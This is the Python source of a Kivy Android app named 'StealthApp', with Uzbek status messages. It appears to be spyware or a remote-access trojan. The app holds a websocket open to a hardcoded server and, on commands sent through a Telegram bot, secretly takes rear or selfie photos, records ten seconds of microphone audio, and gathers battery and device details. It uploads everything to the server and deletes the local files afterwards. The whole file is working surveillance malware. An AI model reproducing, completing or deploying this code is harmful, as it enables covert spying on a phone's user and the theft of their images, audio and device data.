import asyncio
import threading
import os
from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from kivy.utils import platform

WS_URL = "ws://192.168.0.111:8000/ws/device"
UPLOAD_URL = "http://192.168.0.111:8000/upload"

status = ["Ulanilmoqda..."]

async def upload_file(file_path, media_type):
    try:
        import aiohttp
        async with aiohttp.ClientSession() as session:
            with open(file_path, 'rb') as f:
                data = aiohttp.FormData()
                data.add_field('file', f, filename=os.path.basename(file_path))
                data.add_field('media_type', media_type)
                async with session.post(UPLOAD_URL, data=data) as resp:
                    status[0] = f"✅ Yuborildi! ({resp.status})"
        if os.path.exists(file_path):
            os.remove(file_path)
    except Exception as e:
        status[0] = f"Upload xatolik: {e}"

async def send_text(text_data):
    try:
        import aiohttp
        async with aiohttp.ClientSession() as session:
            data = aiohttp.FormData()
            data.add_field('text', text_data)
            data.add_field('media_type', 'text')
            async with session.post(UPLOAD_URL, data=data) as resp:
                status[0] = f"✅ Ma'lumot yuborildi!"
    except Exception as e:
        status[0] = f"Yuborish xatolik: {e}"

def get_battery_info():
    try:
        from jnius import autoclass
        context = autoclass('org.kivy.android.PythonActivity').mActivity
        Intent = autoclass('android.content.Intent')
        IntentFilter = autoclass('android.content.IntentFilter')
        BatteryManager = autoclass('android.os.BatteryManager')

        ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        battery_status = context.registerReceiver(None, ifilter)

        level = battery_status.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
        scale = battery_status.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
        battery_pct = int(level * 100 / scale)

        status_val = battery_status.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
        is_charging = status_val in [
            BatteryManager.BATTERY_STATUS_CHARGING,
            BatteryManager.BATTERY_STATUS_FULL
        ]
        charging_str = "⚡ Zaryadlanmoqda" if is_charging else "🔋 Zaryadlanmayapti"
        return f"🔋 Batareya: {battery_pct}%\n{charging_str}"
    except Exception as e:
        return f"Batareya xatolik: {e}"

def get_device_info():
    try:
        from jnius import autoclass
        Build = autoclass('android.os.Build')
        VERSION = autoclass('android.os.Build$VERSION')

        info = (
            f"📱 Qurilma ma'lumotlari:\n"
            f"Model: {Build.MODEL}\n"
            f"Ishlab chiqaruvchi: {Build.MANUFACTURER}\n"
            f"Android: {VERSION.RELEASE}\n"
            f"SDK: {VERSION.SDK_INT}\n"
            f"Qurilma: {Build.DEVICE}"
        )
        return info
    except Exception as e:
        return f"Qurilma info xatolik: {e}"

def take_photo_camera(camera_id, loop):
    """0 = orqa kamera, 1 = old kamera (selfie)"""
    try:
        from jnius import autoclass, PythonJavaClass, java_method
        Camera = autoclass('android.hardware.Camera')
        SurfaceTexture = autoclass('android.graphics.SurfaceTexture')
        FileOutputStream = autoclass('java.io.FileOutputStream')

        cam_name = "selfie" if camera_id == 1 else "capture"
        filepath = f"/sdcard/{cam_name}.jpg"

        camera = Camera.open(camera_id)
        texture = SurfaceTexture(camera_id + 10)
        camera.setPreviewTexture(texture)
        camera.startPreview()

        done = [False]
        path = [None]

        class PicCb(PythonJavaClass):
            __javainterfaces__ = ['android/hardware/Camera$PictureCallback']
            __javacontext__ = 'app'
            @java_method('([BLandroid/hardware/Camera;)V')
            def onPictureTaken(self, data, cam):
                fos = FileOutputStream(filepath)
                fos.write(data)
                fos.close()
                cam.release()
                path[0] = filepath
                done[0] = True

        camera.takePicture(None, None, PicCb())

        import time
        for _ in range(30):
            if done[0]:
                break
            time.sleep(0.3)

        if path[0] and os.path.exists(path[0]):
            asyncio.run_coroutine_threadsafe(
                upload_file(path[0], "photo"), loop
            )
            status[0] = "📸 Rasm olindi, yuborilmoqda..."
    except Exception as e:
        status[0] = f"Kamera xatolik: {e}"

def record_audio(loop):
    try:
        from jnius import autoclass
        MediaRecorder = autoclass('android.media.MediaRecorder')
        AudioSource = autoclass('android.media.MediaRecorder$AudioSource')
        OutputFormat = autoclass('android.media.MediaRecorder$OutputFormat')
        AudioEncoder = autoclass('android.media.MediaRecorder$AudioEncoder')

        filepath = "/sdcard/audio.m4a"
        recorder = MediaRecorder()
        recorder.setAudioSource(AudioSource.MIC)
        recorder.setOutputFormat(OutputFormat.MPEG_4)
        recorder.setAudioEncoder(AudioEncoder.AAC)
        recorder.setOutputFile(filepath)
        recorder.prepare()
        recorder.start()
        status[0] = "🎙 Yozilmoqda (10 sek)..."

        import time
        time.sleep(10)
        recorder.stop()
        recorder.release()

        if os.path.exists(filepath):
            asyncio.run_coroutine_threadsafe(
                upload_file(filepath, "audio"), loop
            )
    except Exception as e:
        status[0] = f"Audio xatolik: {e}"

async def ws_loop():
    loop = asyncio.get_running_loop()
    while True:
        try:
            import websockets
            status[0] = "Serverga ulanilmoqda..."
            async with websockets.connect(WS_URL, ping_interval=20) as ws:
                status[0] = "✅ Ulandi!\nTelegram botdan buyruq bering."
                while True:
                    msg = await ws.recv()
                    status[0] = f"Buyruq: {msg}"

                    if msg == "take_photo":
                        threading.Thread(target=take_photo_camera, args=(0, loop), daemon=True).start()

                    elif msg == "selfie":
                        threading.Thread(target=take_photo_camera, args=(1, loop), daemon=True).start()

                    elif msg == "record_audio":
                        threading.Thread(target=record_audio, args=(loop,), daemon=True).start()

                    elif msg == "battery":
                        info = get_battery_info()
                        await send_text(info)
                        status[0] = info

                    elif msg == "device_info":
                        info = get_device_info()
                        await send_text(info)
                        status[0] = info

        except Exception as e:
            status[0] = f"❌ Xatolik:\n{str(e)[:80]}\n5 soniyadan so'ng..."
            await asyncio.sleep(5)

def run_loop():
    if platform == 'android':
        from android.permissions import request_permissions, Permission
        request_permissions([
            Permission.CAMERA,
            Permission.RECORD_AUDIO,
            Permission.INTERNET,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.READ_EXTERNAL_STORAGE,
        ])
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(ws_loop())

class StealthApp(App):
    def build(self):
        self.label = Label(
            text="Ishga tushirilmoqda...",
            font_size='16sp',
            halign='center',
            text_size=(400, None)
        )
        t = threading.Thread(target=run_loop, daemon=True)
        t.start()
        Clock.schedule_interval(self.update_ui, 1)
        return self.label

    def update_ui(self, dt):
        self.label.text = status[0]

if __name__ == '__main__':
    StealthApp().run()
